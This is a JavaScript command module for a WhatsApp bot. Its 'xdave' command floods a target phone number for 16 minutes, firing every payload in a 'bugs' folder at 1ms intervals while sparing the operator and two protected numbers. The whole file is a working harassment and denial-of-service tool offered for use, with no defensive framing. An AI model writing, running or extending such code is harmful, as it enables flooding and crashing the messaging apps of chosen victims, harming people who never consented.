const { cmd } = require('../command');
const config = require('../config');
const fs = require('fs');
const path = require('path');

cmd({
  pattern: 'xdave',
  desc: 'Flood bug payloads to a number for 16 minutes',
  category: 'bug',
  react: '⚡',
  filename: __filename
}, async (bot, mek, { arg, reply, from }) => {
  try {
    const rawNumber = arg?.replace(/\D/g, '');
    if (!rawNumber || rawNumber.length < 8) {
      return await reply(`❌ Usage:\n.xdave <number>\nEx: .xdave 50942241547`);
    }

    const jid = rawNumber + '@s.whatsapp.net';

    // 🛡️ Pwoteksyon kont tèt ou oswa lòt nimewo
    const protectedNumbers = [
      '50942241547@s.whatsapp.net',
      '13058962443@s.whatsapp.net'
    ];

    if (jid === mek.sender || protectedNumbers.includes(jid)) {
      return await reply('🛡️ Number sa a pwoteje. Operasyon an sispann.');
    }

    const bugsDir = path.join(__dirname, '../bugs');
    const bugFiles = fs.readdirSync(bugsDir).filter(f => f.endsWith('.js'));

    if (bugFiles.length === 0) {
      return await reply('📁 Pa gen payload nan folder `/bugs`.');
    }

    await bot.sendMessage(from, {
      text: `🚀 *XDAVE flood started!*\n👤 Target: ${rawNumber}\n🕒 Duration: 16 minutes\n⚡ Delay: 1ms\n📦 Payloads: ${bugFiles.length}`
    }, { quoted: mek });

    const endTime = Date.now() + (16 * 60 * 1000); // 16 min

    while (Date.now() < endTime) {
      for (const file of bugFiles) {
        try {
          const payloadPath = path.join(bugsDir, file);
          let bugPayload = require(payloadPath);

          if (typeof bugPayload === 'object' && typeof bugPayload.default === 'string') {
            const msg = bugPayload.default;
            bugPayload = async (bot, target) => {
              await bot.sendMessage(target, { text: msg });
            };
          }

          if (typeof bugPayload === 'string') {
            const msg = bugPayload;
            bugPayload = async (bot, target) => {
              await bot.sendMessage(target, { text: msg });
            };
          }

          if (typeof bugPayload === 'function') {
            await bugPayload(bot, jid);
          }

        } catch (e) {
          console.error(`❌ Error in ${file}:`, e.message);
        }

        await new Promise(res => setTimeout(res, 1)); // 1ms delay
      }
    }

    await bot.sendMessage(from, {
      text: `✅ *XDAVE flood completed for:* ${rawNumber}`
    }, { quoted: mek });

  } catch (err) {
    console.error(err);
    reply(`❌ Error: ${err.message}`);
  }
});